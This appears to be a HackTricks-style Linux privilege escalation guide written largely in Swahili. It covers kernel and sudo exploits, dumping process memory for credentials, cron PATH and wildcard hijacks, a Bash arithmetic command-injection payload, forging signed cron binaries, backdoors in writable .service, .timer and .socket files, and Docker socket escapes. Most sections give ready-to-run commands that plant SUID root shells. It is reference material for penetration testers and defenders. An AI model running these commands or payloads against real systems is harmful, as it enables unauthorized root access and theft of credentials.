# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Njia

Kama una ruhusa za kuandika kwenye saraka yoyote ndani ya variable ya `PATH`, unaweza kuwa na uwezo wa kuchukua udhibiti wa baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa muhimu, nywila au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kagua toleo la kernel na angalia kama kuna exploit yoyote inayoweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo hatarini na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote za kernel zilizo hatarini kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa katika exploit fulani ya kernel na basi utakuwa na uhakika kuwa exploit hiyo ni halali.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo ya sudo yaliyo hatarini yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinawawezesha watumiaji wa ndani wasio na ruhusa kuinua vibali vyao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumiwa kutoka kwenye saraka inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina udhaifu na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: uhakiki wa saini umefeli

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inavyoweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container, unaweza kujaribu kutoroka kutoka ndani yake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kuna kitu chochote kilicho unmounted, unaweza kujaribu ku-mount na kuangalia taarifa za kibinafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit kwani inashauriwa ku-compile kwenye mashine utakayoiitumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kuwa exploited for escalating privileges…\
Inapendekezwa kuangalia kwa mkono toleo la programu zilizo shukiwa zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Kama una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia programu zilizozeeka au zilizo na udhaifu zilizowekwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa za maana, kwa hivyo inashauriwa kutumia baadhi ya programu kama OpenVAS au sawa zitakazokagua ikiwa toleo lolote la programu iliyosakinishwa lina udhaifu kwa exploits zinazojulikana_

## Processes

Tazama **michakato gani** inaendeshwa na uhakiki kama kuna mchakato yoyote mwenye **idhini zaidi kuliko inavyotakiwa** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** inagundua hizo kwa kukagua parameter ya `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia angalia vibali vyako juu ya mabainari ya mchakato, labda unaweza kuandika juu ya mabainari ya mtu mwingine.

### Process monitoring

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia mchakato. Hii inaweza kuwa muhimu sana kubaini mchakato zilizo hatarishi zinazoendeshwa mara kwa mara au wakati seti ya masharti yanatimizwa.

### Process memory

Baadhi ya services za server huhifadhi **credentials in clear text inside the memory**.\
Kwa kawaida utahitaji **root privileges** kusoma memory ya mchakato inayomilikiwa na watumiaji wengine, kwa hiyo hii kawaida ni muhimu zaidi ukiwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Kumbuka kuwa siku hizi mashine nyingi **don't allow ptrace by default** ambayo ina maana huwezi dump processes nyingine zinazomilikiwa na user wako asiye na vibali.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ukiafikiwa kwa memory ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps** zinaonyesha jinsi kumbukumbu imepangiwa ndani ya eneo la anwani za virtual za mchakato huo; pia zinaonyesha **idhinishaji za kila eneo lililopangwa**. Faili ya pseudo **mem** **inafunua kumbukumbu za mchakato mwenyewe**. Kutoka kwenye faili ya **maps** tunajua ni maeneo gani ya kumbukumbu yanayosomwa na offsets yao. Tunatumia taarifa hizi **kufikia faili ya mem na kuandika maeneo yote yanayosomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` inatoa ufikiaji kwa **kumbukumbu ya kimwili** ya mfumo, si kumbukumbu ya pepe. Nafasi ya anwani pepe ya kernel inaweza kupatikana kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni toleo la Linux la zana ya ProcDump iliyobuniwa upya kutoka kwenye mkusanyiko wa zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Ili kufanya dump ya process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mikono mahitaji ya root na kufanya dump ya process inayomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka Process Memory

#### Mfano kwa mikono

Ikiwa utagundua kuwa process ya authenticator inaendeshwa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump process (angalia sehemu zilizopita ili kupata njia tofauti za dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitaiba **clear text credentials** kutoka kwenye kumbukumbu na kutoka kwa baadhi ya **well known files**. Kinahitaji **root privileges** ili kifanye kazi ipasavyo.

| Kipengele                                          | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Majukumu yaliyopangwa / Cron jobs

### Crontab UI (alseambusher) inapoendeshwa kama root – web-based scheduler privesc

Ikiwa paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imebana tu kwenye loopback, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda privileged job ili escalate.

Mnyororo wa kawaida
- Gundua port inayobindishwa kwenye loopback tu (mf., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Pata credentials katika operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda job ya high-priv na iendeshe mara moja (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha
- Usiendeleze Crontab UI kama root; tumia mtumiaji maalum na ruhusa ndogo
- Bind to localhost na pia zuia upatikanaji kupitia firewall/VPN; usitumie nywila mara nyingi
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au EnvironmentFile inayotumika na root pekee
- Wezesha audit/logging kwa utekelezaji wa kazi za on-demand

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kuchukua fursa ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili zinazotumika na root? tumia symlinks? unda faili maalum katika directory inayotumiwa na root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

_(Kumbuka jinsi user "user" ana vibali vya kuandika juu ya /home/user)_

Iwapo ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kutumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza ku-exploit hili kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa katika njia kama** _**/some/path/\***_ **, si dhaifu (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa cron/parser inayotekelezwa kama root inasoma nyanja za log zisizo salama na kuzipatia muktadha wa arithmetic, mshambuliaji anaweza kuingiza command substitution $(...) itakayotekelezwa kama root wakati cron inapoendesha.

- Kwa nini inafanya kazi: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inabadilishwa (ikiendesha amri), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic ili script iendelee bila makosa.

- Mfano wa muundo dhaifu:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Utekelezaji: Pata maandishi yanayotawaliwa na mshambuliaji yandikwe katika log inayochunguzwa ili uwanja unaoonekana kuwa nambari uwe na command substitution na uishie kwa tarakimu. Hakikisha amri yako haichapishi chochote kwenye stdout (au uitumie redirect) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa unaweza **kuhariri cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ilikwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, huenda ikawa muhimu kufuta saraka hiyo na **kuunda saraka ya symlink kuelekea nyingine** inayohudumia script unayedhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Binaries za cron zilizotiwa saini kwa njia maalum na writable payloads
Timu za Blue wakati mwingine hu "sign" binaries zinazoendeshwa na cron kwa kutoa section maalum ya ELF na kutafuta vendor string kabla ya kuziendesha kama root. Ikiwa binary hiyo ni group-writable (mfano, `/opt/AV/periodic-checks/monitor` iliyomilikiwa na `root:devs 770`) na unaweza leak signing material, unaweza kuforge section na kuiba cron task:

1. Tumia `pspy` kunasa verification flow. Katika Era, root alitekeleza `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` na kisha akaendesha faili.
2. Recreate the expected certificate ukitumia the leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Jenga malicious replacement (mfano, drop a SUID bash, add your SSH key) na embed the certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri cron run inayofuata; mara tu naive signature check itakapofanikiwa, payload yako itaendesha kama root.

### Cron jobs za mara kwa mara

Unaweza monitor processes kutafuta processes zinazotekelezwa kila dakika 1, 2 au 5. Huenda ukaweza kuchukua faida yake na escalate privileges.

Kwa mfano, ili **monitor every 0.1s during 1 minute**, **sort by less executed commands** na kufuta commands ambazo zimeendeshwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **putting a carriage return after a comment** (without newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Angalia ikiwa unaweza kuandika faili yoyote `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **iendeshe** backdoor yako **wakati** huduma inapokuwa **imeanzishwa**, **imeanzishwa upya** au **imesimamishwa** (labda utahitaji kusubiri hadi mashine ianzishwe upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili .service na **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Kumbuka kwamba ikiwa una **write permissions over binaries being executed by services**, unaweza kuzibadilisha kuwa backdoors ili wakati services zitakaporudi kutekelezwa, backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa ugundua kwamba unaweza **write** katika folda yoyote za njia hiyo, unaweza kuweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** kwenye faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** lenye **jina lile lile kama relative path binary** ndani ya folda ya PATH ya systemd ambayo unaweza kuandika, na wakati service itapoombwa kutekeleza kitendo dhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasio na ruhusa kwa kawaida hawawezi kuanza/kusimamisha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni faili za unit za systemd ambazo jina lao linaisha kwa `**.timer**` ambazo zinaudhibiti `**.service**` faili au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada uliojengwa kwa matukio ya kalenda na matukio ya wakati monotonic na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma Unit ni nini:

> Unit itakayowashwa wakati timer hii inapomalizika. Hoja ni jina la unit, ambalo kiambishi chake si ".timer". Ikiwa haijatolewa, thamani hii itatumika kwa service yenye jina sawa na timer unit, isipokuwa kiambishi. (Tazama hapo juu.) Inashauriwa kwamba jina la unit litakalowashwa na jina la unit ya timer liwe sawa, isipokuwa kiambishi.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Pata systemd unit fulani (kama a `.service`) ambayo inatekeleza **binary inayoweza kuandikwa**
- Pata systemd unit fulani ambayo inatekeleza **relative path** na una **uruhusa za kuandika** juu ya **systemd PATH** (ili kujifanya executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inawezeshwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya mchakato** kwenye mashine ile ile au mashine tofauti ndani ya modeli za mteja-mtumikishaji. Zinatumia faili za kiashirio za Unix za kawaida kwa mawasiliano kati ya kompyuta na huanzishwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari hutumika **kueleza mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya bandari ya kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **unit ya service inaanzishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza zinapita **kwa unit ya service iliyowashwa**, na unit moja ya service ndiyo inaanzishwa kwa miunganisho yote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo unit moja ya service inashughulikia bila masharti trafiki yote inayoingia. **Chaguo la msingi ni false**. Kwa sababu za utendakazi, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri, ambayo **zinaendeshwa kabla** au **baada** ya kusikiliza **sockets**/FIFOs kuundwa na kufungwa (bound), mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina kamili la faili (absolute filename), ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo **zinatekelezwa kabla** au **baada** ya kusikiliza **sockets**/FIFOs kufungwa na kufutwa, mtawalia.
- `Service`: Inaelezea jina la unit ya **service** **kutekelezwa** kwa **trafiki inayokuja**. Mipangilio hii inaruhusiwa tu kwa sockets zenye `Accept=no`. Kwa msingi, inatumia service yenye jina sawa na socket (ikiwa kiambishi kimebadilishwa). Kwa kawaida haitapaswi kuwa muhimu kutumia chaguo hili.

### Writable .socket files

Ikiwa utapata faili ya `.socket` inayoweza kuandikwa (**writable**) unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itaundwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine itakapowashwa upya.**\
_Kumbuka mfumo lazima uwe ukitumia usanidi wa faili ya socket hiyo au backdoor haitatekelezwa_

### Writable sockets

Ikiwa **utagundua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si faili za usanidi za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.

### Kuenumeresha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Tambua kwamba kunaweza kuwa na baadhi ya **sockets zinazolisikiza HTTP** maombi (_Sina maana ya .socket files, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Docker socket inayoweza kuandikwa

Docker socket, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kundi la `docker`. Kuwa na write access kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linaweza kufanyika na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container ukiwa na upatikanaji wa root kwa mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa moja**

